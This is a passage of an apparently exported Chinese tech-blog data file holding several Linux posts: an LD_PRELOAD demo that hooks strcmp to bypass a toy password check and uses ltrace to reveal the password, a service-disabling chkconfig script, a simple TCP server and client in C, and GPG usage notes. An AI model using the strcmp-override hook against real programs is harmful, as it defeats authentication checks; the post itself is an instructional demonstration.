-o test test.c\n[root@localhost preload]# ./test\n-->input your passwd:123\npasswd err\n[root@localhost preload]# gcc -shared -o hack.o hack.c\n[root@localhost preload]# ls -l hack.so\n-rwxr-xr-x 1 root root 4116 Apr 13 15:52 hack.so\n[root@localhost preload]# LD_PRELOAD=\"./hack.so\"\n[root@localhost preload]# ./test\n-->input your passwd:123\npasswd err\n[root@localhost preload]# export LD_PRELOAD=\"./hack.so\"\n[root@localhost preload]# ./test\n-->input your passwd:123\nhack function invoked. s1=[abcd],s2=[123]\nok!. open door\n[root@localhost preload]#\n</pre>\n<p>这是一种思路，还有一种最直接的办法用ltrace<br>ltrace是跟踪调用库函数的工具</p>\n<pre>\n[root@localhost preload]# export LD_PRELOAD=\n[root@localhost preload]# ltrace ./test\n(0x69951c, 0x699ab0, 0, 0, 0x699e58)                                              = 0x6998e4\n__libc_start_main(0x80484a4, 1, 0xbf948364, 0x8048530, 0x8048520 <unfinished ...>\nprintf(\"-->input your passwd:\")                                                   = 21\n__isoc99_scanf(0x80485ff, 0xbf9482a2, 0x9acce0, 0x9abff4, 0x8048530-->input your passwd:123\n)              = 1\nstrcmp(\"abcd\", \"123\")                                                             = 1\nputs(\"passwd err\"passwd err\n)                                                                = 11\nexit(1 <unfinished ...>\n+++ exited (status 1) +++\n[root@localhost preload]#\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>在Unix操作系统的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。<br>  大家想到着就邪恶了吧，今天看proxychanis代码发现的，和win平台sockscap32类似。<br> 看代码test.c</p>\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nint main(void)\n{\n    char *passwd=\"abcd\";\n    char in_buff[10];\n    printf(\"-->input your passwd:\");\n    scanf(\"%s\", in_buff);\n    if( strcmp(passwd,in_buff) != 0) {\n        printf(\"passwd errn\");\n        exit(-1);\n    }\n    printf(\"ok!. open doorn\");\n}\n</pre>\n<p>库代码hack.c</p>\n<pre>\n#include <stdio.h>\nint strcmp(const char *s1, const char *s2)\n{\n    printf(\"hack function invoked. s1=[%s],s2=[%s]n\", s1, s2);\n    return 0;\n}\n</pre>\n<pre>\n[root@localhost preload]# gcc -o test test.c\n[root@localhost preload]# ./test\n-->input your passwd:123\npasswd err\n[root@localhost preload]# gcc -shared -o hack.o hack.c\n[root@localhost preload]# ls -l hack.so\n-rwxr-xr-x 1 root root 4116 Apr 13 15:52 hack.so\n[root@localhost preload]# LD_PRELOAD=\"./hack.so\"\n[root@localhost preload]# ./test\n-->input your passwd:123\npasswd err\n[root@localhost preload]# export LD_PRELOAD=\"./hack.so\"\n[root@localhost preload]# ./test\n-->input your passwd:123\nhack function invoked. s1=[abcd],s2=[123]\nok!. open door\n[root@localhost preload]#\n</pre>\n<p>这是一种思路，还有一种最直接的办法用ltrace<br>ltrace是跟踪调用库函数的工具</p>\n<pre>\n[root@localhost preload]# export LD_PRELOAD=\n[root@localhost preload]# ltrace ./test\n(0x69951c, 0x699ab0, 0, 0, 0x699e58)                                              = 0x6998e4\n__libc_start_main(0x80484a4, 1, 0xbf948364, 0x8048530, 0x8048520 <unfinished ...>\nprintf(\"-->input your passwd:\")                                                   = 21\n__isoc99_scanf(0x80485ff, 0xbf9482a2, 0x9acce0, 0x9abff4, 0x8048530-->input your passwd:123\n)              = 1\nstrcmp(\"abcd\", \"123\")                                                             = 1\nputs(\"passwd err\"passwd err\n)                                                                = 11\nexit(1 <unfinished ...>\n+++ exited (status 1) +++\n[root@localhost preload]#\n</pre>"},{"title":"linux快速优化，去多余服务。","date":"2010-12-03T14:32:00.000Z","_content":"#!/bin/sh<p> </p><p>#by:key1088</p>services=`chkconfig --list|cut -f1`<br />for ser in $services<br />do<br /> if [ &quot;$ser&quot; == &quot;network&quot; ]||[ &quot;$ser&quot; == &quot;syslog&quot; ]||[ &quot;$ser&quot; == &quot;sshd&quot; ]||[ &quot;$ser&quot; == &quot;crond&quot; ]||[ &quot;$ser&quot; == &quot;atd&quot; ];<br /> then<br />&nbsp;&nbsp;&nbsp;  chkconfig &quot;$ser&quot; on<br /> else<br />&nbsp;&nbsp;&nbsp;  chkconfig &quot;$ser&quot; off<br /> fi<br />done<br />echo &quot;network success!&quot;<br />echo &quot;syslog sucss!!&quot;<br />echo &quot;sshd success!!!!&quot;<br />echo &quot;crond success!!&quot;<br />echo &quot;atd success!!&quot;<br /><br />","source":"_posts/linux快速优化，去多余服务。.md","raw":"title: linux快速优化，去多余服务。\ncategories: [Linux]\ntags: []\ndate: 2010-12-03 22:32:00\n---\n#!/bin/sh<p> </p><p>#by:key1088</p>services=`chkconfig --list|cut -f1`<br />for ser in $services<br />do<br /> if [ &quot;$ser&quot; == &quot;network&quot; ]||[ &quot;$ser&quot; == &quot;syslog&quot; ]||[ &quot;$ser&quot; == &quot;sshd&quot; ]||[ &quot;$ser&quot; == &quot;crond&quot; ]||[ &quot;$ser&quot; == &quot;atd&quot; ];<br /> then<br />&nbsp;&nbsp;&nbsp;  chkconfig &quot;$ser&quot; on<br /> else<br />&nbsp;&nbsp;&nbsp;  chkconfig &quot;$ser&quot; off<br /> fi<br />done<br />echo &quot;network success!&quot;<br />echo &quot;syslog sucss!!&quot;<br />echo &quot;sshd success!!!!&quot;<br />echo &quot;crond success!!&quot;<br />echo &quot;atd success!!&quot;<br /><br />","slug":"linux快速优化，去多余服务。","published":1,"updated":"2023-04-22T05:38:44.820Z","_id":"clgrjlxgj003e7opi8d8j6u82","comments":1,"layout":"post","photos":[],"link":"","content":"<p>#!&#x2F;bin&#x2F;sh<p> </p><p>#by:key1088</p>services&#x3D;<code>chkconfig --list|cut -f1</code><br />for ser in $services<br />do<br /> if [ &quot;$ser&quot; &#x3D;&#x3D; &quot;network&quot; ]||[ &quot;$ser&quot; &#x3D;&#x3D; &quot;syslog&quot; ]||[ &quot;$ser&quot; &#x3D;&#x3D; &quot;sshd&quot; ]||[ &quot;$ser&quot; &#x3D;&#x3D; &quot;crond&quot; ]||[ &quot;$ser&quot; &#x3D;&#x3D; &quot;atd&quot; ];<br /> then<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;  chkconfig &quot;$ser&quot; on<br /> else<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;  chkconfig &quot;$ser&quot; off<br /> fi<br />done<br />echo &quot;network success!&quot;<br />echo &quot;syslog sucss!!&quot;<br />echo &quot;sshd success!!!!&quot;<br />echo &quot;crond success!!&quot;<br />echo &quot;atd success!!&quot;<br /><br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>#!&#x2F;bin&#x2F;sh<p> </p><p>#by:key1088</p>services&#x3D;<code>chkconfig --list|cut -f1</code><br />for ser in $services<br />do<br /> if [ &quot;$ser&quot; &#x3D;&#x3D; &quot;network&quot; ]||[ &quot;$ser&quot; &#x3D;&#x3D; &quot;syslog&quot; ]||[ &quot;$ser&quot; &#x3D;&#x3D; &quot;sshd&quot; ]||[ &quot;$ser&quot; &#x3D;&#x3D; &quot;crond&quot; ]||[ &quot;$ser&quot; &#x3D;&#x3D; &quot;atd&quot; ];<br /> then<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;  chkconfig &quot;$ser&quot; on<br /> else<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;  chkconfig &quot;$ser&quot; off<br /> fi<br />done<br />echo &quot;network success!&quot;<br />echo &quot;syslog sucss!!&quot;<br />echo &quot;sshd success!!!!&quot;<br />echo &quot;crond success!!&quot;<br />echo &quot;atd success!!&quot;<br /><br /></p>\n"},{"title":"Linux 网络编程学习-简单实现TCP通讯","date":"2013-04-17T14:18:50.000Z","_content":"以后，争取每天写一个工作除外的程序，练习练习代码能力。主要是方便自己看，不是学习系列,误伤莫怪。\n上代码了\n<pre>\nroot@bt:~/c/network# cat server.c\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/types.h>\n#include <arpa/inet.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\nint main(int argc, char *argv[])\n{\n\tstruct sockaddr_in server_addr;\n\tstruct sockaddr_in client_addr;\n\tint port;\n\tint sin_size;\n\tint sockfd, new_sockfd;\n\tchar hello[]=\"hello,world for inetd\";\n\tif(argc != 2) {\n\t\tfprintf(stderr, \"[Usage:] %s postan\", argv[0]);\n\t\texit(1);\n\t}\n\tport = atoi(argv[1]);\n\tprintf(\"port=%dn\", port);\n\tif((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n\t\tfprintf(stderr, \"socket error %san\", strerror(errno));\n\t\texit(1);\n\t}\n\tint n = 1;\n\tsetsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &n ,sizeof(n));\n\tbzero(&server_addr, sizeof(struct sockaddr_in));\n\tserver_addr.sin_family = AF_INET;\n\tserver_addr.sin_addr.s_addr = htonl(INADDR_ANY);\n\tserver_addr.sin_port = htons(port);\n\tif(bind(sockfd, (struct sockaddr *)(&server_addr), sizeof(struct sockaddr)) == -1){\n\t\tfprintf(stderr,\"bind error %san\", strerror(errno));\n\t\texit(1);\n\t}\n\tif(listen(sockfd, 5) == -1) {\n\t\tfprintf(stderr, \"listen error %san\", strerror(errno));\n\t\texit(1);\n\t}\n\twhile ( 1 ) {\n\t\tsin_size = sizeof(struct sockaddr);\n\t\tif((new_sockfd=accept(sockfd, (struct sockaddr *)(&client_addr), &sin_size)) == -1) {\n\t\t\tfprintf(stderr, \"accept error %san\", strerror(errno));\n\t\t\texit(1);\n\t\t}\n\t\tfprintf(stderr, \"server get connection from %sn\", inet_ntoa(client_addr.sin_addr));\n\t\tif(write(new_sockfd, hello, strlen(hello)) == -1) {\n\t\t\tfprintf(stderr, \"write to client error %san\", strerror(errno));\n\t\t\tclose(new_sockfd);\n\t\t\tcontinue;\n\t\t}\n\t\tclose(new_sockfd);\n\t}\n\tclose(sockfd);\n\treturn 0;\n}\n</pre>\n<pre>\nroot@bt:~/c/network# cat client.c\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <errno.h>\nint main(int argc, char **argv)\n{\n\tstruct sockaddr_in server_addr;\n\tint\tsockfd, port, nbytes;\n\tchar\tbuffer[1024];\n\tstruct hostent *host;\n\tif(argc != 3) {\n\t\tfprintf(stderr, \"Usage:%s hostname port\", argv[0]);\n\t\texit(1);\n\t}\n\tif((host=gethostbyname(argv[1])) == NULL) {\n\t\tfprintf(stderr, \"gethostbyname error %sna\", strerror(errno));\n\t\texit(1);\n\t}\n\tif((port=atoi(argv[2])) < 0) {\n\t\tfprintf(stderr, \"port input errorna\");\n\t\texit(1);\n\t}\n\tif((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1 ){\n\t\tfprintf(stderr, \"socket error %sna\", strerror(errno));\n\t\texit(1);\n\t}\n\tbzero(&server_addr, sizeof(struct sockaddr_in));\n\tserver_addr.sin_family = AF_INET;\n\tserver_addr.sin_addr.s_addr=inet_addr(argv[1]);\n\tserver_addr.sin_port = htons(port);\n\tif(connect(sockfd, (struct sockaddr *)(&server_addr), sizeof(struct sockaddr )) == -1) {\n\t\tfprintf(stderr, \"connect error %sna\", strerror(errno));\n\t\texit(1);\n\t}\n\tif((nbytes=read(sockfd, buffer, 1024)) == -1) {\n\t\tfprintf(stderr, \"read sockfd error %sna\", strerror(errno));\n\t\texit(1);\n\t}\n\tbuffer[nbytes]='0';\n\tprintf(\"buffer=[%s]n\", buffer);\n\tclose(sockfd);\n\treturn 0;\n}\n</pre>\n<pre>\nroot@bt:~/c/network# cat Makefile\nall:server client\nserver:server.c\n\tgcc $^ -o $@\nclient:client.c\n\tgcc $^ -o $@\n</pre>","source":"_posts/Linux-网络编程学习-简单实现TCP通讯.md","raw":"title: Linux 网络编程学习-简单实现TCP通讯\ncategories: [程序设计,C编程]\ntags: []\ndate: 2013-04-17 22:18:50\n---\n以后，争取每天写一个工作除外的程序，练习练习代码能力。主要是方便自己看，不是学习系列,误伤莫怪。\n上代码了\n<pre>\nroot@bt:~/c/network# cat server.c\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/types.h>\n#include <arpa/inet.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\nint main(int argc, char *argv[])\n{\n\tstruct sockaddr_in server_addr;\n\tstruct sockaddr_in client_addr;\n\tint port;\n\tint sin_size;\n\tint sockfd, new_sockfd;\n\tchar hello[]=\"hello,world for inetd\";\n\tif(argc != 2) {\n\t\tfprintf(stderr, \"[Usage:] %s postan\", argv[0]);\n\t\texit(1);\n\t}\n\tport = atoi(argv[1]);\n\tprintf(\"port=%dn\", port);\n\tif((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n\t\tfprintf(stderr, \"socket error %san\", strerror(errno));\n\t\texit(1);\n\t}\n\tint n = 1;\n\tsetsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &n ,sizeof(n));\n\tbzero(&server_addr, sizeof(struct sockaddr_in));\n\tserver_addr.sin_family = AF_INET;\n\tserver_addr.sin_addr.s_addr = htonl(INADDR_ANY);\n\tserver_addr.sin_port = htons(port);\n\tif(bind(sockfd, (struct sockaddr *)(&server_addr), sizeof(struct sockaddr)) == -1){\n\t\tfprintf(stderr,\"bind error %san\", strerror(errno));\n\t\texit(1);\n\t}\n\tif(listen(sockfd, 5) == -1) {\n\t\tfprintf(stderr, \"listen error %san\", strerror(errno));\n\t\texit(1);\n\t}\n\twhile ( 1 ) {\n\t\tsin_size = sizeof(struct sockaddr);\n\t\tif((new_sockfd=accept(sockfd, (struct sockaddr *)(&client_addr), &sin_size)) == -1) {\n\t\t\tfprintf(stderr, \"accept error %san\", strerror(errno));\n\t\t\texit(1);\n\t\t}\n\t\tfprintf(stderr, \"server get connection from %sn\", inet_ntoa(client_addr.sin_addr));\n\t\tif(write(new_sockfd, hello, strlen(hello)) == -1) {\n\t\t\tfprintf(stderr, \"write to client error %san\", strerror(errno));\n\t\t\tclose(new_sockfd);\n\t\t\tcontinue;\n\t\t}\n\t\tclose(new_sockfd);\n\t}\n\tclose(sockfd);\n\treturn 0;\n}\n</pre>\n<pre>\nroot@bt:~/c/network# cat client.c\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <errno.h>\nint main(int argc, char **argv)\n{\n\tstruct sockaddr_in server_addr;\n\tint\tsockfd, port, nbytes;\n\tchar\tbuffer[1024];\n\tstruct hostent *host;\n\tif(argc != 3) {\n\t\tfprintf(stderr, \"Usage:%s hostname port\", argv[0]);\n\t\texit(1);\n\t}\n\tif((host=gethostbyname(argv[1])) == NULL) {\n\t\tfprintf(stderr, \"gethostbyname error %sna\", strerror(errno));\n\t\texit(1);\n\t}\n\tif((port=atoi(argv[2])) < 0) {\n\t\tfprintf(stderr, \"port input errorna\");\n\t\texit(1);\n\t}\n\tif((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1 ){\n\t\tfprintf(stderr, \"socket error %sna\", strerror(errno));\n\t\texit(1);\n\t}\n\tbzero(&server_addr, sizeof(struct sockaddr_in));\n\tserver_addr.sin_family = AF_INET;\n\tserver_addr.sin_addr.s_addr=inet_addr(argv[1]);\n\tserver_addr.sin_port = htons(port);\n\tif(connect(sockfd, (struct sockaddr *)(&server_addr), sizeof(struct sockaddr )) == -1) {\n\t\tfprintf(stderr, \"connect error %sna\", strerror(errno));\n\t\texit(1);\n\t}\n\tif((nbytes=read(sockfd, buffer, 1024)) == -1) {\n\t\tfprintf(stderr, \"read sockfd error %sna\", strerror(errno));\n\t\texit(1);\n\t}\n\tbuffer[nbytes]='0';\n\tprintf(\"buffer=[%s]n\", buffer);\n\tclose(sockfd);\n\treturn 0;\n}\n</pre>\n<pre>\nroot@bt:~/c/network# cat Makefile\nall:server client\nserver:server.c\n\tgcc $^ -o $@\nclient:client.c\n\tgcc $^ -o $@\n</pre>","slug":"Linux-网络编程学习-简单实现TCP通讯","published":1,"updated":"2023-04-22T05:38:44.661Z","_id":"clgrjlxh3003q7opigajic729","comments":1,"layout":"post","photos":[],"link":"","content":"<p>以后，争取每天写一个工作除外的程序，练习练习代码能力。主要是方便自己看，不是学习系列,误伤莫怪。<br>上代码了</p>\n<pre>\nroot@bt:~/c/network# cat server.c\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/types.h>\n#include <arpa/inet.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\nint main(int argc, char *argv[])\n{\n    struct sockaddr_in server_addr;\n    struct sockaddr_in client_addr;\n    int port;\n    int sin_size;\n    int sockfd, new_sockfd;\n    char hello[]=\"hello,world for inetd\";\n    if(argc != 2) {\n        fprintf(stderr, \"[Usage:] %s postan\", argv[0]);\n        exit(1);\n    }\n    port = atoi(argv[1]);\n    printf(\"port=%dn\", port);\n    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n        fprintf(stderr, \"socket error %san\", strerror(errno));\n        exit(1);\n    }\n    int n = 1;\n    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &n ,sizeof(n));\n    bzero(&server_addr, sizeof(struct sockaddr_in));\n    server_addr.sin_family = AF_INET;\n    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);\n    server_addr.sin_port = htons(port);\n    if(bind(sockfd, (struct sockaddr *)(&server_addr), sizeof(struct sockaddr)) == -1){\n        fprintf(stderr,\"bind error %san\", strerror(errno));\n        exit(1);\n    }\n    if(listen(sockfd, 5) == -1) {\n        fprintf(stderr, \"listen error %san\", strerror(errno));\n        exit(1);\n    }\n    while ( 1 ) {\n        sin_size = sizeof(struct sockaddr);\n        if((new_sockfd=accept(sockfd, (struct sockaddr *)(&client_addr), &sin_size)) == -1) {\n            fprintf(stderr, \"accept error %san\", strerror(errno));\n            exit(1);\n        }\n        fprintf(stderr, \"server get connection from %sn\", inet_ntoa(client_addr.sin_addr));\n        if(write(new_sockfd, hello, strlen(hello)) == -1) {\n            fprintf(stderr, \"write to client error %san\", strerror(errno));\n            close(new_sockfd);\n            continue;\n        }\n        close(new_sockfd);\n    }\n    close(sockfd);\n    return 0;\n}\n</pre>\n<pre>\nroot@bt:~/c/network# cat client.c\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <errno.h>\nint main(int argc, char **argv)\n{\n    struct sockaddr_in server_addr;\n    int\tsockfd, port, nbytes;\n    char\tbuffer[1024];\n    struct hostent *host;\n    if(argc != 3) {\n        fprintf(stderr, \"Usage:%s hostname port\", argv[0]);\n        exit(1);\n    }\n    if((host=gethostbyname(argv[1])) == NULL) {\n        fprintf(stderr, \"gethostbyname error %sna\", strerror(errno));\n        exit(1);\n    }\n    if((port=atoi(argv[2])) < 0) {\n        fprintf(stderr, \"port input errorna\");\n        exit(1);\n    }\n    if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1 ){\n        fprintf(stderr, \"socket error %sna\", strerror(errno));\n        exit(1);\n    }\n    bzero(&server_addr, sizeof(struct sockaddr_in));\n    server_addr.sin_family = AF_INET;\n    server_addr.sin_addr.s_addr=inet_addr(argv[1]);\n    server_addr.sin_port = htons(port);\n    if(connect(sockfd, (struct sockaddr *)(&server_addr), sizeof(struct sockaddr )) == -1) {\n        fprintf(stderr, \"connect error %sna\", strerror(errno));\n        exit(1);\n    }\n    if((nbytes=read(sockfd, buffer, 1024)) == -1) {\n        fprintf(stderr, \"read sockfd error %sna\", strerror(errno));\n        exit(1);\n    }\n    buffer[nbytes]='0';\n    printf(\"buffer=[%s]n\", buffer);\n    close(sockfd);\n    return 0;\n}\n</pre>\n<pre>\nroot@bt:~/c/network# cat Makefile\nall:server client\nserver:server.c\n    gcc $^ -o $@\nclient:client.c\n    gcc $^ -o $@\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>以后，争取每天写一个工作除外的程序，练习练习代码能力。主要是方便自己看，不是学习系列,误伤莫怪。<br>上代码了</p>\n<pre>\nroot@bt:~/c/network# cat server.c\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/types.h>\n#include <arpa/inet.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\nint main(int argc, char *argv[])\n{\n    struct sockaddr_in server_addr;\n    struct sockaddr_in client_addr;\n    int port;\n    int sin_size;\n    int sockfd, new_sockfd;\n    char hello[]=\"hello,world for inetd\";\n    if(argc != 2) {\n        fprintf(stderr, \"[Usage:] %s postan\", argv[0]);\n        exit(1);\n    }\n    port = atoi(argv[1]);\n    printf(\"port=%dn\", port);\n    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n        fprintf(stderr, \"socket error %san\", strerror(errno));\n        exit(1);\n    }\n    int n = 1;\n    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &n ,sizeof(n));\n    bzero(&server_addr, sizeof(struct sockaddr_in));\n    server_addr.sin_family = AF_INET;\n    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);\n    server_addr.sin_port = htons(port);\n    if(bind(sockfd, (struct sockaddr *)(&server_addr), sizeof(struct sockaddr)) == -1){\n        fprintf(stderr,\"bind error %san\", strerror(errno));\n        exit(1);\n    }\n    if(listen(sockfd, 5) == -1) {\n        fprintf(stderr, \"listen error %san\", strerror(errno));\n        exit(1);\n    }\n    while ( 1 ) {\n        sin_size = sizeof(struct sockaddr);\n        if((new_sockfd=accept(sockfd, (struct sockaddr *)(&client_addr), &sin_size)) == -1) {\n            fprintf(stderr, \"accept error %san\", strerror(errno));\n            exit(1);\n        }\n        fprintf(stderr, \"server get connection from %sn\", inet_ntoa(client_addr.sin_addr));\n        if(write(new_sockfd, hello, strlen(hello)) == -1) {\n            fprintf(stderr, \"write to client error %san\", strerror(errno));\n            close(new_sockfd);\n            continue;\n        }\n        close(new_sockfd);\n    }\n    close(sockfd);\n    return 0;\n}\n</pre>\n<pre>\nroot@bt:~/c/network# cat client.c\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <errno.h>\nint main(int argc, char **argv)\n{\n    struct sockaddr_in server_addr;\n    int\tsockfd, port, nbytes;\n    char\tbuffer[1024];\n    struct hostent *host;\n    if(argc != 3) {\n        fprintf(stderr, \"Usage:%s hostname port\", argv[0]);\n        exit(1);\n    }\n    if((host=gethostbyname(argv[1])) == NULL) {\n        fprintf(stderr, \"gethostbyname error %sna\", strerror(errno));\n        exit(1);\n    }\n    if((port=atoi(argv[2])) < 0) {\n        fprintf(stderr, \"port input errorna\");\n        exit(1);\n    }\n    if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1 ){\n        fprintf(stderr, \"socket error %sna\", strerror(errno));\n        exit(1);\n    }\n    bzero(&server_addr, sizeof(struct sockaddr_in));\n    server_addr.sin_family = AF_INET;\n    server_addr.sin_addr.s_addr=inet_addr(argv[1]);\n    server_addr.sin_port = htons(port);\n    if(connect(sockfd, (struct sockaddr *)(&server_addr), sizeof(struct sockaddr )) == -1) {\n        fprintf(stderr, \"connect error %sna\", strerror(errno));\n        exit(1);\n    }\n    if((nbytes=read(sockfd, buffer, 1024)) == -1) {\n        fprintf(stderr, \"read sockfd error %sna\", strerror(errno));\n        exit(1);\n    }\n    buffer[nbytes]='0';\n    printf(\"buffer=[%s]n\", buffer);\n    close(sockfd);\n    return 0;\n}\n</pre>\n<pre>\nroot@bt:~/c/network# cat Makefile\nall:server client\nserver:server.c\n    gcc $^ -o $@\nclient:client.c\n    gcc $^ -o $@\n</pre>"},{"title":"linux 下 GPG加解密","date":"2011-07-11T03:51:00.000Z","_content":"<strong></strong>\n互联网是不安全，当今是，将来也是。加密和解密都是相对的，都是有难度系数也确定的。\nGPG 有两个key，一个是公钥，一个是私钥。公钥加密，私钥解密。\n要想加密，必须拥有自己或者别人的公钥key。\n要想解密，必须拥有该加密文件的私钥key和密码。\n简单的记录一下。\n&nbsp;\n&nbsp;\n1.生成密钥对。（本机）<strong></strong>\nshell &gt;gpg --gen-key&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #生成密钥对\nshell&gt;gpg -K&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #查看私钥\nshell&gt;gpg --list-keys&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; #查看公钥\n主要是加密种类、名称、日期、密码等\n2.导出公钥。（本机）\nshell&gt;gpg --export -a -r <em>[key1088]</em>&gt; pub.key&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #导出名字为key1088的公钥。\n把生成的公钥，发送到目标电脑。\n3.导入目标（目标）\nshell&gt;gpg --import <em>[pub.key]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</em>#导入名字为pub.key的文件\nshell&gt;gpg --list-keys&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #查看公钥，有没有key1088公钥。\n4.加密（目标）\nshell&gt;gpg -e -r <em>[key1088]&nbsp;&nbsp; test.txt &nbsp;&nbsp;&nbsp;&nbsp;</em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #使用key1088的公钥，加密test.txt文件 ,生成一个名字为test.txt.asc\nshell&gt;gpg <em>[test.txt.asc]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</em> #失败！！会提示没有密钥。只有蜜月才可以解密。\n把加密文件，发送到本机，进行解密。\n5.解密（本机）\nshell&gt;gpg <em>[test.txt.asc]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #输入密码方可解密。<br />\n&nbsp;","source":"_posts/linux-下-GPG加解密.md","raw":"title: linux 下 GPG加解密\ncategories: [网络安全,Linux,Shell编程]\ntags: []\ndate: 2011-07-11 11:51:00\n---\n<strong></strong>\n互联网是不安全，当今是，将来也是。加密和解密都是相对的，都是有难度系数也确定的。\nGPG 有两个key，一个是公钥，一个是私钥。公钥加密，私钥解密。\n要想加密，必须拥有自己或者别人的公钥key。\n要想解密，必须拥有该加密文件的私钥key和密码。\n简单的记录一下。\n&nbsp;\n&nbsp;\n1.生成密钥对。（本机）<strong></strong>\nshell &gt;gpg 